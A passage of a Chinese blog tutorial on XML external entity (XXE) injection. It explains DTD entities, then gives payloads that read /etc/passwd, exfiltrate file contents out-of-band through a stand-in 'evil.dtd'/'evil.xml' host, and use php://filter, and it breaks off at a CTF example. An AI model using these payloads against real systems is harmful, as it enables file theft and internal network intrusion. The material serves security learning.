<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="什么是XXE漏洞？XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。　libxml2.9.1及以后，默认不解析外部实体。该漏洞也就逐渐衰落。 原理是什么？个人理解，XML可以引用外部实体，也就是类似于文件包含，造成漏洞。 XML 简单了解">
<meta property="og:type" content="article">
<meta property="og:title" content="XXE漏洞初探及简单实战">
<meta property="og:url" content="http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/index.html">
<meta property="og:site_name" content="Imp1ture">
<meta property="og:description" content="什么是XXE漏洞？XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。　libxml2.9.1及以后，默认不解析外部实体。该漏洞也就逐渐衰落。 原理是什么？个人理解，XML可以引用外部实体，也就是类似于文件包含，造成漏洞。 XML 简单了解">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/2022-04-15-23-26-52.png">
<meta property="article:published_time" content="2022-04-15T14:16:46.000Z">
<meta property="article:modified_time" content="2022-04-15T17:21:43.732Z">
<meta property="article:author" content="Imp1ture">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/2022-04-15-23-26-52.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>XXE漏洞初探及简单实战</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">文章</a></li><!--
     --><!--
       --><li><a href="/tags/">分类</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2022/04/18/BUUCTF-WEB-WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-intval-md5-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2022/04/13/%E5%88%9D%E6%8E%A2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A5ctf%E9%A2%98%E7%9B%AE%E4%B8%BA%E4%BE%8B/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&text=XXE漏洞初探及简单实战"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&is_video=false&description=XXE漏洞初探及简单实战"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XXE漏洞初探及简单实战&body=Check out this article: http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&name=XXE漏洞初探及简单实战&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&t=XXE漏洞初探及简单实战"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFXXE%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">什么是XXE漏洞？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">原理是什么？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML-%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">XML 简单了解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DTD%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">DTD简单了解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E5%88%86%E4%B8%BA%E4%B8%80%E8%88%AC%E5%AE%9E%E4%BD%93%E5%92%8C%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">4.1.</span> <span class="toc-text">实体分为一般实体和参数实体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">DTD实体声明（重点）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">如何构造外部实体注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">5.1.</span> <span class="toc-text">有回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8DTD%E6%96%87%E6%A1%A3"><span class="toc-number">5.1.1.</span> <span class="toc-text">不引用外部DTD文档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8DTD%E6%96%87%E6%A1%A3"><span class="toc-number">5.1.2.</span> <span class="toc-text">引用外部DTD文档</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">5.2.</span> <span class="toc-text">无回显</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">6.</span> <span class="toc-text">XXE带来的危害</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B31-%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-number">6.1.</span> <span class="toc-text">危害1.读取任意文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE-1"><span class="toc-number">6.1.1.</span> <span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%8C%E6%9A%82%E6%9C%AA%E5%AE%9E%E6%B5%8B"><span class="toc-number">6.1.2.</span> <span class="toc-text">无回显，暂未实测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B32-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">6.2.</span> <span class="toc-text">危害2.拒绝服务攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B33-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81-%E6%89%A7%E8%A1%8C"><span class="toc-number">6.3.</span> <span class="toc-text">危害3.远程命令(代码)执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B34-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">6.4.</span> <span class="toc-text">危害4.内网信息探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B35-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E7%BD%91%E7%AB%99"><span class="toc-number">6.5.</span> <span class="toc-text">危害5.攻击内网网站</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">7.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#buuctf-PHP-XXE"><span class="toc-number">7.1.</span> <span class="toc-text">buuctf [PHP]XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solr-CVE-2017-12629-RCE"><span class="toc-number">7.2.</span> <span class="toc-text">[Solr]CVE-2017-12629-RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        XXE漏洞初探及简单实战
    </h1>



	
    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Imp1ture</span>
      </span>
	  <!--Leancloud 阅读量-->
	  
	<span id="/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/" class="leancloud-visitors" data-flag-title="XXE漏洞初探及简单实战">
		<em class="post-meta-item-text">阅读量</em>
		<i class="leancloud-visitors-count">loading</i>
	</span>



	  
	  <!--Leancloud 阅读量-->
	  
      
    <div class="postdate">
      
        <time datetime="2022-04-15T14:16:46.000Z" itemprop="datePublished">2022-04-15</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="什么是XXE漏洞？"><a href="#什么是XXE漏洞？" class="headerlink" title="什么是XXE漏洞？"></a>什么是XXE漏洞？</h1><p>XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。　libxml2.9.1及以后，默认不解析外部实体。该漏洞也就逐渐衰落。</p>
<h1 id="原理是什么？"><a href="#原理是什么？" class="headerlink" title="原理是什么？"></a>原理是什么？</h1><p>个人理解，XML可以引用外部实体，也就是类似于文件包含，造成漏洞。</p>
<h1 id="XML-简单了解"><a href="#XML-简单了解" class="headerlink" title="XML 简单了解"></a>XML 简单了解</h1><ul>
<li>XML被设计为传输和存储数据，其焦点是数据的内容。</li>
<li>HTML被设计用来显示数据，其焦点是数据的外观。</li>
</ul>
<h1 id="DTD简单了解"><a href="#DTD简单了解" class="headerlink" title="DTD简单了解"></a>DTD简单了解</h1><p>Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。<br>可以理解成个性化的XML格式 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/dtd/dtd_entities.asp">DTD实体传送</a><br>一般的payload结构</p>
<p><img src="/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/2022-04-15-23-26-52.png"></p>
<h2 id="实体分为一般实体和参数实体"><a href="#实体分为一般实体和参数实体" class="headerlink" title="实体分为一般实体和参数实体"></a>实体分为一般实体和参数实体</h2><ol>
<li>一般实体的声明：<!ENTITY 实体名称 "实体内容"></li>
</ol>
<p>　　　引用一般实体的方法：&amp;实体名称;</p>
<p>　　p.s.经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
<ol start="2">
<li>参数实体的声明：<!ENTITY % 实体名称 "实体内容"></li>
</ol>
<p>　　　引用参数实体的方法：%实体名称;</p>
<p>　　p.s.经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</p>
<p>　　如果实体名称中出现如&lt;的特殊字符，解析就会失败。为了避免这种情况，XML用实体引用替换特殊字符。XML预定义了五个实体引用，即用&lt;、 &gt;、 &amp;、 &amp;apos、 “替换&lt;、&gt;、&amp;、’、”。</p>
<h2 id="DTD实体声明（重点）"><a href="#DTD实体声明（重点）" class="headerlink" title="DTD实体声明（重点）"></a>DTD实体声明（重点）</h2><ol>
<li>内部实体声明</li>
</ol>
<p>　　<!ENTITY 实体名称 "实体的值"></p>
<p>　　当引用一般实体时，由三部分构成：&amp;、实体名、；，当是用参数传入xml的时候，&amp;需URL编码，不然&amp;会被认为是参数间的连接符号。</p>
<p>　　示例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;Dawn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span>©right;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li><p>外部实体声明</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　<span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI/URL&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/181064.html">不同语言框架支持的协议传送门</a><br>简单的例子</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;file;</span>©right;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="如何构造外部实体注入攻击"><a href="#如何构造外部实体注入攻击" class="headerlink" title="如何构造外部实体注入攻击"></a>如何构造外部实体注入攻击</h1><p>分有无回显</p>
<h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><h3 id="不引用外部DTD文档"><a href="#不引用外部DTD文档" class="headerlink" title="不引用外部DTD文档"></a>不引用外部DTD文档</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">      <span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">              <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">      ]&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="引用外部DTD文档"><a href="#引用外部DTD文档" class="headerlink" title="引用外部DTD文档"></a>引用外部DTD文档</h3></li>
<li><p>引用外部文档，再引用外部实体</p>
<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>引用，这里理解为实体文件已经被包含</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE a <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.dtd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>通过DTD外部实体声明引入外部实体声明<br>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>引用，个人理解为外部实体文档被声明为实体参数，还需要引用才生效</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">          <span class="meta">&lt;!ENTITY % d <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %d;</span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2></li>
<li><p>第一种写法</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span> </span><br><span class="line"> <span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c://test/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.xml&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"> %dtd; %all; </span></span><br><span class="line"><span class="meta"> ]&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中evil.xml文件内容为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。<br>2. 第二种写法<br>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><br>   其中evil.xml文件内容为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://localhost/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</span><br></pre></td></tr></table></figure>
<h1 id="XXE带来的危害"><a href="#XXE带来的危害" class="headerlink" title="XXE带来的危害"></a>XXE带来的危害</h1><p>利用xxe漏洞可以进行文件读取，拒绝服务攻击，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等。内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做。</p>
<h2 id="危害1-读取任意文件"><a href="#危害1-读取任意文件" class="headerlink" title="危害1.读取任意文件"></a>危害1.读取任意文件</h2><h3 id="有回显-1"><a href="#有回显-1" class="headerlink" title="有回显"></a>有回显</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>例：<br>buuctf 题目BUU XXE COURSE 1，登陆抓包，发现</p>
